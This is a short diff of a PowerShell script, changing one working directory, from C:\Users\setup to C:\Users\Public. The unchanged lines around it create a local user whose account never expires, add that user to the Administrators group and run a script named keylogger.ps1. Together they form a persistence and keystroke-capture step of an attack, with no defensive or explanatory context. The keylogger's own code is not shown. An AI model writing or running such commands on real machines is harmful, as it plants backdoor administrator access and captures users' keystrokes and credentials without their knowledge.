@@ -1,4 +1,4 @@
 New-LocalUser -Name "newuser" -AccountNeverExpires
 Add-LocalGroupMember -Group "Administrators" -Member "newuser"
-cd C:\Users\setup
+cd C:\Users\Public
 ./keylogger.ps1
